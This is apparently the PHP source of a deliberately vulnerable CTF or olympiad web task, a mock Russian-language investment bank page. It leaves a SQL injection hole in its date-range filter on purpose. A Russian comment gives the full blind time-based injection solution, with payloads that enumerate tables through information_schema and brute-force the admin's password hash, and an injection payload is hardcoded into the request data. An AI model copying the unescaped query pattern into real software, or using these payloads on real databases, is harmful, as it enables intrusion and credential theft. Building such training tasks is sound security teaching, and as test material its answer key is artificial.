<?php
error_reporting(0);

define("sqlHost", "127.0.0.1");
define("sqlUser", "root");
define("sqlPass", "vertrigo");
define("sqlDbName", "sqli");
$sqlUsers = "hamsters";
$sqlTrans = "transactions";

function connect_db() {
	$sqlID = mysql_connect(sqlHost, sqlUser, sqlPass) or die('error 1: '.mysql_error());
	mysql_select_db(sqlDbName, $sqlID) or die('error 2: '.mysql_error());
}

if (!session_id()) session_start();
if (!isset($_SESSION["user"])) {
	session_unset();
	header("Location: login.php");
	exit();
}

connect_db();
if (isset($_POST["payment"])) {
	$money = min(10005000, max((int) $_POST["money"], 0));
	if ($money > 0) {
		$query = "INSERT INTO `{$sqlTrans}` (`user`, `value`, `percent`, `date`) VALUES ".
			"('{$_SESSION["user"]}', {$money}, 0.0, NOW())";
		mysql_query($query) or die(mysql_error());
	}
}
if (isset($_POST["away"])) {
	die("Приносим извинения");
}

$query = "SELECT SUM(value) as balance FROM `transactions` WHERE `user`='{$_SESSION['user']}'";
$result = mysql_query($query);
$balance = mysql_fetch_object($result)->balance;
/*
if (isset($_POST["filter"])) {
	$message = $_POST["filter"];
} else {
	#$message = "') LIMIT 0,0 UNION SELECT ".
	#	"if(ascii(substring((SELECT column_name from information_schema.columns where table_schema=database() and table_name like 'bank%' limit 0,1),1,1))<=110, sleep(5), null)-- ";
	$message = "') LIMIT 0,0 UNION SELECT ".
		"substring((SELECT `password` from `bank_users` where `login`='admin' limit 0,1),1,5)-- ";
	$message = "пасиб";
}
*/

function sanitize_date($data) {
	return "STR_TO_DATE('{$data}', '%Y-%m-%d %H:%i')";
}
/*
Как хакать:
sql injection в поле диапозона дат.
"'" не проканывает, "')" тоже. проканывает только "', '')" из-за функции STR_TO_DATE - но если это сложно для олимпиады, можно убрать STR_TO_DATE, и будет "')".
Т.е уязвимый запрос:
SELECT SUM(value) FROM `transactions` WHERE `user`='admin' AND `date` BETWEEN STR_TO_DATE('ololo', '%Y-%m-%d %H:%i') AND STR_TO_DATE('injection_here', '') UNION SELECT ...-- 

Так как и UNION SELECT, и ORDER BY обломятся либо на SELECT SUM(value) либо на SELECT *, то инъекция слепая.
Начинаем раскручивать, вместо ... постепенно вставляем такие запросы:
1) бинарным поиском ищем названия таблиц, меняя ascii номер и в limit указывая какую по счету таблицу подбираем.
if(ascii(substring((SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<110, sleep(5), null)-- 
2) зная имя таблицы `hamsters` можно угадать, что внутри нее есть колонки id, user, pass. но можно и их пробрутить:
if(ascii(substring((SELECT column_name from information_schema.columns where table_schema=database() and table_name='hamsters' limit 0,1),1,1))<110, sleep(5), null)-- 
3) зная имена колонок можно догадаться, что id админа первый, или что user у него 'admin'. теперь брутим его md5
if(ascii(substring((SELECT `pass` from `hamsters` where `user`='admin' limit 0,1),1,1))<110, sleep(5), null)-- 
4) md5 и будет флагом
*/
$between = "";
$_POST = array('history' => 1, 'from' => '', 'to' => '');
if (isset($_POST["history"])) {
	$_POST["to"] = "', '') UNION SELECT ".
		"if(ascii(substring((SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<110, sleep(5), null)-- ";
	$from = sanitize_date($_POST["from"]);
	$to = sanitize_date($_POST["to"]);
	$between = " AND `date` BETWEEN {$from} AND {$to}";
}

$filter = " WHERE `user`='{$_SESSION["user"]}'".$between;
$query = "SELECT SUM(value) as yield FROM `{$sqlTrans}`{$filter}";
var_dump($query);
$result = mysql_query($query) or die(mysql_error());
var_dump(mysql_num_rows($result));
$row = mysql_fetch_assoc($result);
var_dump($row);
$yield = (int) $row["yield"];

$transactions = array();
$query = "SELECT * FROM `{$sqlTrans}`{$filter}";
var_dump($query);
$result = mysql_query($query) or die(mysql_error());
var_dump(mysql_num_rows($result));
while ($row = mysql_fetch_assoc($result)) {
	$transactions[] = $row;
}
?><!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta http-equiv="Cache-Control" content="no-cache"/>
	<title>31337 Investments</title>
	
	<link type="text/css" href="css/jquery.simple-dtpicker.css" rel="stylesheet" />	
	
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	<script type="text/javascript" src="js/jquery.simple-dtpicker.js"></script>
</head>
<body>
<div class="x">
	Ваш баланс: <?php echo $balance; ?> руб<br>
</div>
<div class="x">
	<form method="POST">
	Пополнить на <input type="text" name="money"> руб 
	<input type="submit" name="payment" value="Пополнить">
	</form>
</div>
<div class="x">
	<form method="POST">
	Вывести <input type="text" name="money"> руб 
	<input type="submit" name="away" value="Вывести">
	</form>
</div>
<div class="x">
	<form method="POST">
	История счета за период: 
	<input type="text" id="range_from" name="from">
	<input type="text" id="range_to" name="to">
	<script type="text/javascript">
		$(function(){
			$('#range_from').appendDtpicker({
				"closeOnSelected": true
			});
			$('#range_to').appendDtpicker({
				"closeOnSelected": true
			});
		});
	</script>
	<input type="submit" name="history" value="Показать">
	</form>
</div>
<div>
	Доходность счета: <?php echo $yield; ?> руб
</div>
<div>
	История транзакций
	<?php
		foreach ($transactions as $row) {
			var_dump($row);
		}
	?>
</div>
</body>
</html>